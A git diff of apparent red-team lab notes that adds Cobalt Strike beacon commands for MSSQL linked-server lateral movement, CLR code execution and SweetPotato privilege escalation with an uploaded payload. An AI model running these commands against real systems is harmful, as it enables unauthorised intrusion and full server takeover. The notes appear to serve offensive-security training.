@@ -59,14 +59,32 @@ code execution via MSSQL (requires local admin on the SQL server or sysadmin rol
         disable it:
             beacon> sql-disableclr lon-db-1
 
-privilege escalation via MSSQL:
+linked servers:
     we can enumerate linked servers for lateral movement
     enumerate linked servers:
         beacon> sql-links lon-db-1
     query the linked server:
         beacon> sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2
-    enumerate user permissions on linked server:
+    enumerate user permissions on the linked server:
         beacon> sql-whoami lon-db-1 "" lon-db-2
+    check if rpc out is enabled (this is required to call stored procedures on the linked server):
+        beacon> sql-checkrpc lon-db-1
+    enable rpc out:
+        beacon> sql-enablerpc lon-db-1 lon-db-2
+    interact with it via CLR:
+        beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" lon-db-2
+
+priv esc via MSSQL:
+    NT Service\MSSQLSERVER accounts often have token privileges we can abuse for priv esc
+        e.g. SeImpersonate which can be exploited using SweetPotato (https://github.com/CCob/SweetPotato)
+    we can enumerate these using whoami /priv
+        beacon> getuid
+        beacon run whoami /priv
+    using sweetpotato:
+        beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
+        beacon> upload C:\Payloads\tcp-local_x64.exe
+        beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
+        beacon> connect localhost 1337
 
 
 example one-liners:
